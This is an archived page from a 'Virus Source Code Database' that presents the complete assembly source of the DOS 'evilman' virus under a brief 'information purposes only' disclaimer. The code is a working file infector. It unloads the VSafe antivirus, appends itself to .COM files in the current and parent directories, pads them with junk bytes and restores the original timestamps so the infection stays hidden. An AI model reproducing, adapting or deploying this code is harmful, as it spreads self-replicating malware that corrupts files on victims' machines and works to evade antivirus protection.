<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: evilman_asm</title>
<meta name="KEYWORDS" content="evilman.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for evilman.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="ear_6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/ear_6_asm.php">ear_6_asm</a><br>
<a href="ear6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/ear6_asm.php">ear6_asm</a><br>
<a href="earthda__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/earthda__asm.php">earthda__asm</a><br>
<a href="earthday_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/earthday_asm.php">earthday_asm</a><br>
<a href="e_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/e_asm.php">e_asm</a><br>
<a href="easytroj_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/easytroj_pas.php">easytroj_pas</a><br>
<a href="ebbelqux_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/ebbelqux_asm.php">ebbelqux_asm</a><br>
<a href="ebbelwoi_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/ebbelwoi_asm.php">ebbelwoi_asm</a><br>
<a href="ebugdis1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/ebugdis1_asm.php">ebugdis1_asm</a><br>
<a href="ebugdis__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/ebugdis__asm.php">ebugdis__asm</a><br>
<a href="eddie2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/eddie2_asm.php">eddie2_asm</a><br>
<a href="eddie_3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/eddie_3_asm.php">eddie_3_asm</a><br>
<a href="eddie3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/eddie3_asm.php">eddie3_asm</a><br>
<a href="eddie_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/eddie_asm.php">eddie_asm</a><br>
<a href="edv_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/edv_asm.php">edv_asm</a><br>
<a href="ee3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/ee3_asm.php">ee3_asm</a><br>
<a href="eemvoor1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/eemvoor1_asm.php">eemvoor1_asm</a><br>
<a href="eemvoor2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/eemvoor2_asm.php">eemvoor2_asm</a><br>
<a href="eemvoor3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/eemvoor3_asm.php">eemvoor3_asm</a><br>
<a href="eemvoord_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/eemvoord_asm.php">eemvoord_asm</a><br>
<a href="emf__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/emf__asm.php">emf__asm</a><br>
<a href="emf_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/emf_asm.php">emf_asm</a><br>
<a href="emfii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/emfii_asm.php">emfii_asm</a><br>
<a href="emma_10_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/emma_10_asm.php">emma_10_asm</a><br>
<a href="emmie_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/emmie_asm.php">emmie_asm</a><br>
<a href="encode_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/encode_asm.php">encode_asm</a><br>
<a href="en_com_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/en_com_asm.php">en_com_asm</a><br>
<a href="encrcom_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/encrcom_asm.php">encrcom_asm</a><br>
<a href="encrexe_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/encrexe_asm.php">encrexe_asm</a><br>
<a href="encroach_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/encroach_asm.php">encroach_asm</a><br>
<a href="encrypt_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/encrypt_asm.php">encrypt_asm</a><br>
<a href="enemy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/enemy_asm.php">enemy_asm</a><br>
<a href="enew_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/enew_asm.php">enew_asm</a><br>
<a href="en_exe_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/en_exe_asm.php">en_exe_asm</a><br>
<a href="enigma__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/enigma__asm.php">enigma__asm</a><br>
<a href="enigma_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/enigma_asm.php">enigma_asm</a><br>
<a href="erasboot_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/erasboot_asm.php">erasboot_asm</a><br>
<a href="erasef_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/erasef_asm.php">erasef_asm</a><br>
<a href="eric-c_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/eric-c_asm.php">eric-c_asm</a><br>
<a href="es1411_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/es1411_asm.php">es1411_asm</a><br>
<a href="estonia_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/estonia_asm.php">estonia_asm</a><br>
<a href="etern562_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/etern562_asm.php">etern562_asm</a><br>
<a href="etern599_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/etern599_asm.php">etern599_asm</a><br>
<a href="eternit2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/eternit2_asm.php">eternit2_asm</a><br>
<a href="eternit__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/eternit__asm.php">eternit__asm</a><br>
<a href="eternity_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/eternity_asm.php">eternity_asm</a><br>
<a href="etr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/etr_asm.php">etr_asm</a><br>
<a href="evilman_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/evilman_asm.php">evilman_asm</a><br>
<a href="exebug2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/exebug2_asm.php">exebug2_asm</a><br>
<a href="exebug_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/exebug_asm.php">exebug_asm</a><br>
<a href="extasy__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/extasy__asm.php">extasy__asm</a><br>
<a href="extasy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/extasy_asm.php">extasy_asm</a><br>
<a href="ezint1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/ezint1_asm.php">ezint1_asm</a><br>
<a href="ezint2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/ezint2_asm.php">ezint2_asm</a><br>
<a href="ezint4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/ezint4_asm.php">ezint4_asm</a><br>
<a href="ezint_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/ezint_asm.php">ezint_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

.model tiny                     ; needed to be a .com program
.radix 16                       ; assume hexidecimal instead of decimal
.code                           ; code starts

		org 100h        ; com's start at cs:100 (needed for tlink)

virus_size      equ    last - virus             ; Defines virus size

virus:          mov     si,si
		nop
		nop
		mov     ax,0fa01h               ; unload Vsafe 
		mov     dx,5945h
		int     16h
		call    where                   ; push ip onto stack
where:          mov     di,sp                   ; mov stack pointer to di
		mov     bp,word ptr ss:[di]     ; thanks to The Unforgiven
		sub     bp,10f                  ; for this code
		inc     sp                      ; read loc into bp
		inc     sp                      ; inc sp ý to correct

		lea     bx,[bp+offset return_bytes]     ; Load the address
							; of bp plus the
							; original offset
							; of return bytes
							; into di.
		push    ds:[bx]                 ; push the first two bytes of the
						; original program onto the stack
		inc     bx                      ; increase di to point to the next
		inc     bx                      ; two bytes we saved of the orig prog
		push    ds:[bx]                 ; push the last two bytes we saved
						; of the original program onto the
						; stack
		
		
		mov     ah,1a                   ; Set DTA
		lea     dx,[bp+offset last]     ; Load the effective address
						; of the end of the virus to
						; be used for the new DTA
		int     21
		int     3                
		
too_cool:        mov     ah,4e                   ; Find the first match
get_files:      lea     dx,[bp+offset filemask] ; Load the offset filemask dx
		int     21                      
		jc      tree
		
		jmp     getbad1
tree:           jmp     exit_error
getbad1:        mov     ah,2f                   ; get the new DTA
		int     21                      ; this is returned in bx
		xor     ax,ax                   ; clear up ax
		lea     si,[bx+1e]              ; lea in si data + junk to get 
look:           lodsb                           ; to file, mov this value to al
		or      al,al                   ; is it Zero if not do again
		jne     look                    ; lodsb again
		sub     si,4                    ; found end of file name sub 4 
		lodsb                           ; to get extension load into al
		cmp     al,43                   ; is it C as in com file
		je      stupid                  ; not search again

wow:            jmp     nxt_vic
stupid:         lea     dx,[bp+offset last+1e]  ; Load the offset fname (á)
		
		mov     ax, 4301h               ; DTA
		xor     cx, cx                  ; Clear file attributes
		int     21h                     ; Issue the call
		
		mov     ax,3d02                 ; Open file read/write
		int     21                       
		xchg    bx,ax                   ; handle --> BX
		lea     di,[bp+offset last+1a]  ; Load the offset fsize (á)
		mov     ax,word ptr ds:[di]     ; Move this fsize into ax
		sub     ax,3                    ; Take off three to build jmp
		mov     word ptr [bp+jump_address+1],ax ; save these bytes
						; at jump address+1 which is
						; jmp (xx xx+3) or 0e9 xx xx

		mov     ah,3f                   ; Read file
		mov     cx,4                    ; Read 4 bytes
		lea     dx,[bp+offset return_bytes]     ; Load the offset dx
		int     21
		lea     di,[bp+offset return_bytes+3]   ; Load the offset of
							; the fourth byte
							; we just read into
							; the virus
		cmp     byte ptr ds:[di],90     ; Is this byte a nop?
		je      exit_now                ; If so assume infected,
						; close file, and run
						; infection cycle again


		mov     ax,4200                 ; Goto beginning of file
		xor     cx,cx                   ; cx=0
		xor     dx,dx                   ; dx=0
		int     21
		mov     ax,5700                 ; get the files original date
		int     21                      ; and time and move this 
		mov     [date],dx               ; value to date/ time
		mov     [time],cx
		mov     ah,40                   ; Write file
		mov     cx,4                    ; Write four bytes
		lea     dx,[bp+offset jump_address]     ; Load the offset of 
							; the bytes to write 
							; (which is our jmp 
							; constuction)
		int     21
		mov     ax,4202                 ; Goto end of file
		xor     cx,cx                   ; cx=0
		xor     dx,dx                   ; dx=0
		int     21
		mov     ah,40                   ; Write file
		mov     cx,virus_size           ; Write the virus size
		lea     dx,[bp+offset virus]    ; Load the offset of the
						; virus into dx
		int     21
		
		mov     ax,2c00                 ; get system date/time info
		int     21
		
		mov     cl,dl                   ; move the hundreths of a second into
		mov     al,cl
		
		mov     ax,2c00                 ; get system date/time info
		int     21
		
		mov     cl,dl                   ; move the hundreths of a second into
		add     cl,al
		ror     cl,1
		
		
		xor     ch,ch                   ; cl and zero ch
		
		xor     dx,dx                   ; zero Dx
		
		mov     ah,40h                  ; Write additional junk onto end of file
		int     21h
		
		mov     cx,[time]               ; Write the original date
		mov     dx,[date]               ; back to the infected file 
		mov     ax,5701
		int     21

exit_now:       mov     ah,3e                   ; Close the file, the
						; infection is complete
		int     21
nxt_vic:        mov     ah,4f                   ; Continue the infection
						; process.  Find the next
						; match!
		jmp     get_files               ; Doit again, and stop only
						; when int 21 ah=4f reports
						; no more matches!
exit_error:    
		mov     dx,offset path_name
		mov     ah,3bh
		int     21h
		jc      exit_w
		jmp     too_cool
		
exit_w:         mov     ah,1a                   ; Set DTA
		mov     dx,80                   ; Change to original DTA
		int     21
		mov     bx,102                  ; Set bx to 102
		pop     [bx]                    ; pop the last two saved
						; bytes into ds:[102]
		dec     bx                      ; decrease bx so that is
		dec     bx                      ; points to 100
		pop     [bx]                    ; pop the first two saved
						; bytes into ds:[100]
		push    bx                      ; bx=100
		xor     ax,ax                   ; most viruses don't do this
		xor     bx,bx                   ; sequence, but since some
		xor     cx,cx                   ; programs assume the reg's
		xor     dx,dx                   ; are set to 0 like they
		xor     bp,bp                   ; should be, this is an
		xor     si,si                   ; extra precaution.
		xor     di,di
gone:           ret                             ; return to host
path_name       db      '..',0 

date            dw      ? 
time            dw      ?
filemask        db      '*.*',0                 ; Look for *.com's
jump_address    db      0e9,0,0,90              ; jmp xx xx+3, and 90 is the
new_dta         dw      ?                       ; infection marker
return_bytes    db      0cdh,20,0,0             ; simple way to end the
						; first generation (it's
						; the same as saying int 20)
last:

end virus
code ends

</textarea></td></tr></table></body></html>
